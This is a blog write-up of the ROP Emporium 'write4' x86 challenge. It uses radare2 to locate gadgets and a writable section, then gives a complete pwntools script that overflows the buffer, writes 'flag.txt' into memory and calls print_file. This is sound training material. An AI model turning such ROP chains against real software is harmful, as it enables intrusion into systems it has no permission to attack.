---
layout: post
title:  "ROP Emporium write4 Writeup (x86)"
date:   2024-06-04 13:15:45 -0400
categories: rop-emporium write4
tags: rop-emporium write4 x86 writeup buffer-overflow rop reverse-engineering 32-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[fourth challenge](https://ropemporium.com/challenge/write4.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/write4.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves!

## Exploit Crafting
The offset for `x86` challenges will be `44 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
for this series.

### Write Gadget
> Check out `usefulFunction`'s assembly
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. We will need to write `flag.txt` to
memory so let's check the `usefulGadgets` section
in `usefulFunction`
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful gadgets](/images/write4/x86-useful-gadgets.png)

The `mov` instruction will set the value from
`ebp` (4 byte qword) into the dereferenced address 
set in `edi`. This is what we'll use to write to memory!
The gadget address is `0x08048543`

### Mov Arguments
> Find a gadget to control `edi` and `ebp` along with
> a writable program segment
{: .prompt-tip }
Now we need to find a gadget which can control `edi` and
`ebp` to control what to write and where to write it. We
can use the `/R` command to search for gadgets
```
/R pop edi
```

![mov args gadget](/images/write4/x86-mov-args-gadget.png)

There are a few which come up but might as well use
this one. Remember we can control where we jump so we
can skip the `pop ebx` and `pop esi` instructions 
entirely! The address we'll use to set `edi` and 
`ebp` is `0x080485aa`

Now that we can control where to write and what to write,
where and what should we write? We want to open `flag.txt`
so we'll set that into `ebp`. But we need to find a
suitable location to write to. We can view writable
sections with the command `iS`

![writable sections](/images/write4/x86-writable-sections.png)

We need to find a section with the `w` permission and a
size of at least 8 bytes (0x08). Let's use the `.data`
section which has the address `0x0804a018`

The python code to write data to an address looks
like this
```python
#!/bin/python3
from pwn import *

# write byte string s to address addr
# return payload in bytes
def write_str(addr, s):
    payload = b''
    # write every 4 bytes of a string
    for i in range(0, len(s), 4):
        # address to write to
        edi = p32(addr + i)

        # prevent slice out of bounds
        j = i+4
        if j >= len(s):
            j = len(s)

        # 4 bytes to write
        ebp = p32(int.from_bytes(s[i:j], 'little'))

        # set mov args
        payload += p32(pop_edi_ebp)
        payload += edi
        payload += ebp

        # write bytes
        payload += p32(write_gadget)
    return payload
```

### print_file()
> Find the `print_file` address and a gadget which
> `pop`s any register
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/write4/x86-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x080483d0`

Now we need to set the first argument to this function.
According to the
[x86 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf){:target="_blank"}{:rel="noopener noreferrer"},
function arguments are passed through the stack. Remember
from the
[callme challenge]({% post_url 2024-06-02-rop-emporium-callme-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
that we'll need to set a `pop` gadget as a function's return
address to keep the stack maintained for additional function
calls. We can just use the `pop` gadget we found earlier!

![pop gadget](/images/write4/x86-mov-args-gadget.png)

Since we only want to `pop` one argument off of the
stack we can just execute `pop ebp`. This makes our
gadget address `0x080485ab`

Here's a reusable function to add arguments to the stack
in `x86`
```python
#!/bin/python3
from pwn import *

# add arguments to stack (x86)
def add_args(args):
    # fix stack after func returns
    payload = p32(pop_ebp)
    for a in args:
        payload += p32(a)
    return payload
```

## Exploit
We finally have everything to build the exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
write_gadget = 0x08048543   # mov qword [edi], ebp
pop_edi_ebp = 0x080485aa
data_addr = 0x0804a018
print_file_addr = 0x080483d0
pop_ebp = 0x080485ab

# write byte string s to address addr
# return payload in bytes
def write_str(addr, s):
    payload = b''
    # write every 4 bytes of a string
    for i in range(0, len(s), 4):
        # address to write to
        edi = p32(addr + i)

        # prevent slice out of bounds
        j = i+4
        if j >= len(s):
            j = len(s)

        # 4 bytes to write
        ebp = p32(int.from_bytes(s[i:j], 'little'))

        # set mov args
        payload += p32(pop_edi_ebp)
        payload += edi
        payload += ebp

        # write bytes
        payload += p32(write_gadget)
    return payload

# add arguments to stack (x86)
def add_args(args):
    # fix stack after func returns
    payload = p32(pop_ebp)
    for a in args:
        payload += p32(a)
    return payload

# create payload
payload = b'A' * 44

# write flag.txt to data section
payload += write_str(data_addr, b'flag.txt')

# call print_file(flag_txt_addr)
payload += p32(print_file_addr)
payload += add_args([data_addr])

# send payload + receive flag
io = process('./write432')
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```
![flag](/images/write4/x86-flag.png)

## Conclusion
In this challenge we learned how to write arbitrary
data to memory. By this point we should be relatively
comfortable finding and chaining gadgets together. Next
we'll learn how to deal with forbidden characters in
our payload.

[Previous Challenge (callme)]({% post_url 2024-06-02-rop-emporium-callme-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

Next Challenge (badchars)

[write4 x64]({% post_url 2024-06-03-rop-emporium-write4-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
